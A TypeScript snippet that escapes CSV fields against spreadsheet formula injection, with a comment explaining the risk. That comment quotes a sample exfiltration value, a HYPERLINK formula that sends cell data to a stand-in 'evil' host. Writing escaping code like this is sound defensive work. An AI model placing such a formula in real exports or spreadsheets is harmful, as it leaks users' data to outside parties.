// A cell starting with = + - @ (or a tab/CR, which Excel strips first) is
// run as a formula when the CSV is opened in Excel/Sheets — e.g. a theme
// named =HYPERLINK("https://evil/?"&A1,"x") would send cell data off-site.
// Prefixing an apostrophe makes the spreadsheet show it as plain text.
const FORMULA_START_RE = /^[=+\-@\t\r]/;

export function escapeCsvField(value: string): string {
  const safe = FORMULA_START_RE.test(value) ? `'${value}` : value;
  if (/[",\n\r]/.test(safe)) {
    return `"${safe.replace(/"/g, '""')}"`;
  }
  return safe;
}
